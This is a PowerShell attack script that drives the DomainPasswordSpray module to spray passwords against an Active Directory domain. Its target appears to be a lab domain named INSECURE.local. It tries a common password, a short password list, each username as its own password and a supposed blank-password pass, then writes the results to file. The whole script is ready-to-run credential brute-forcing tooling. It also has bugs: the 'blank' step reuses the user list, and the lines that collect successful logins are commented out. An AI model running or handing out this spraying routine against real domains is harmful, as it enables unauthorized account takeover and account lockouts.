
<#

1) Set Variables

$global:target="192.168.80.50"
$global:domain = "INSECURE.local"
$global:userlist = "users.txt"
#

2) run the script 

./brute_domainpasswordspray.ps1

#>


$global:target=$args[0]


function run-domainpassspray {

Import-Module .\DomainPasswordSpray.ps1

$userlist =  "users.txt"
#$userlist =  "C:\Windows\Temp\dusers.txt"

# Custom Password List 
$passlist = "pass100.txt"


date 

del domainpassspray_brute.txt

# pasword 
Invoke-DomainPasswordSpray -Domain $domain -UserList $userlist -Password password -Force -OutFile domainpassspray_brute.txt
#Get-Content .\domainpassspray_brute.txt| findstr "SUCCESS" | sort-object| Get-Unique > domainpassspray_brute_cracked.txt
#cat domainpassspray_brute_cracked.txt


# pass5.txt
Invoke-DomainPasswordSpray -Domain $domain -Force -UserList $userlist -PasswordList pass5.txt -OutFile domainpassspray_brute.txt
#Get-Content .\domainpassspray_brute.txt| findstr "SUCCESS" | sort-object| Get-Unique >> domainpassspray_brute_cracked.txt
#cat domainpassspray_brute_cracked.txt


# userlist = password  - a bit shitty way of doing it 
Invoke-DomainPasswordSpray -Domain $domain -Force -UserList  $userlist -PasswordList  $userlist -OutFile domainpassspray_brute.txt
#Get-Content .\domainpassspray_brute.txt| findstr "SUCCESS" | sort-object| Get-Unique >> domainpassspray_brute_cracked.txt
#cat domainpassspray_brute_cracked.txt


# pass_blank.txt
Invoke-DomainPasswordSpray -Domain $domain -Force -UserList  $userlist -PasswordList  $userlist -OutFile domainpassspray_brute.txt
#Get-Content .\domainpassspray_brute.txt| findstr "SUCCESS" | sort-object| Get-Unique >> domainpassspray_brute_cracked.txt
#cat domainpassspray_brute_cracked.txt




# this is a bit shitty so just commented it out 
#write-host "===========================[ Invoke-DomainPasswordSpray: user = pass ]==========================="
#ForEach ($user in Get-Content $userlist) {
#echo $user | Out-File -Encoding ascii tempuser-$user.txt
#Invoke-DomainPasswordSpray -Force -UserList tempuser-$user.txt -PasswordList tempuser-$user.txt -OutFile domainpassspray_brute.txt
#}  
#del tempuser.txt
#write-host "================================================================"
#
#----



date
echo ""
echo ""
echo "################ FINISHED ################"
echo ""
Get-Content domainpassspray_brute_cracked.txt
}


run-domainpassspray 




